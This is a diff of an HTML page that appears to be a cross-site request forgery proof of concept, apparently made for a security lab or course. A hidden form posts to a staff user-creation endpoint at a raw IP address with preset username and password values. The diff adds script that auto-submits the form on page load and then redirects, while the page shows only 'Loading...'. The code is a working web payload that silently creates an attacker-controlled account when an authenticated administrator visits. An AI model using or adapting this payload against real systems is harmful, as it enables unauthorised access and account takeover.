@@ -9,22 +9,24 @@
 </head>
 
 <body>
-    <h3 style="text-align: center">Loading...</h3>
-    <p style="text-align: center">Please wait</p>
+    <h3>Loading...</h3>
+    <p></p>
     <div style="display: none">
-    <form action="https://104.198.208.81/red/public/staff/users/new.php" style="display: none" id="form1" method="POST">
-        <input name="first_name" value="Johnny">
-        <input name="last_name" value="Bravo">
-        <input name="username" value="johnnybravo">
-        <input name="email" value="johnnybravo@gmail.com">
-        <input type="password" name="password" value="111111111Aa#">
-        <input type="password" name="confirm_password" value="111111111Aa#">
-        <button id="myform" type="submit" form="form1" value="Create">Create</button>
-    </form>
-</div>
+        <form action="https://104.198.208.81/red/public/staff/users/new.php" style="display: none" id="form1" method="POST">
+            <input name="first_name" value="Johnny">
+            <input name="last_name" value="Bravo">
+            <input name="username" value="johnnybravo">
+            <input name="email" value="johnnybravo@gmail.com">
+            <input type="password" name="password" value="111111111Aa#">
+            <input type="password" name="confirm_password" value="111111111Aa#">
+            <button id="myform" type="submit" form="form1" value="Create">Create</button>
+        </form>
+    </div>
     <script>
-        setTimeout(()=>{document.location = "https://104.198.208.81/red/public/staff/index.php"},1000)
-        document.location = "https://104.198.208.81/red/public/staff/index.php"
+        setTimeout(() => {
+            document.location = "https://104.198.208.81/red/public/staff/index.php"
+        }, 1000)
+        document.getElementById("myform").click();
     </script>
 </body>
 
